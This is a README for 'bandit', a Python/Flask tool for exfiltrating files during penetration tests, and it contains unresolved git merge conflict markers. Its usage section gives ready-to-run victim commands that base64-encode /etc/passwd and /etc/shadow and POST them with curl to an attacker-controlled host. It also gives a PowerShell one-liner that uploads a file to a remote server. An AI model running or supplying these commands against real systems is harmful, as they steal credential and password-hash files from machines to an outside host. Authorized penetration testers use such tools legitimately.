# bandit
A quick and easy way to exfiltrate files

# purpose
Bandit is designed as a simple way to exfiltrate files during a penetration test without relying on dedicated tools on a compromised host. However, it can be used in any situation where uploads need to happen quickly and easily - for example, automated backup programs. 
While the server is written in python/flask, the uploads are handled through base64 and curl - both of which are nearly ubiquitous on most unix systems. This miniscule footprint means no file movement is needed to begin using bandit on any given linux-based system. The simplicity of the protocol also allows for custom programs to be written that leverage it - for example, a windows program could handle encoding and uploading the files. 

# usage
Attacker: ```python3 bandit.py [port]```

Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/```

It is important to use double quotes to allow bash to process reading the files and encoding them before upload

If you wish to overwrite the existing files, instead of failing to upload if they exist on the server, specify the /overwrite path. This will scribble over any existing files on the server that conflict with the attempted upload, so use with caution. Yes, path travesal checks are made before file IO

Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/overwrite```

<<<<<<< HEAD
Bandit is also compatible with Windows Powershell, although usage is not as straightforward. To save you some time, here is a oneliner to upload a single file, filename.txt, to the remote server as uploadedfile:

```if ($PWD.Provider.Name -eq 'FileSystem') { [System.IO.Directory]::SetCurrentDirectory($PWD) } ; Invoke-WebRequest -Uri http://yourip:port -Method POST -Body @{uploadedfile=[Convert]::ToBase64String([IO.File]::ReadAllbytes("filename.txt"))}```
=======
Note that bandit supports multiple files uploaded at the same time. Simply add as many parameters as you wish, one for each file, in the following format:

[desired filename]=[base64 encoded contents]

The simplicity of the protocol makes it easy to use one-liners to upload files, or create custom wrapper scripts for more thorough uploads. 
>>>>>>> 4ac9430564bcebac23691431249b41c5f23db3e5
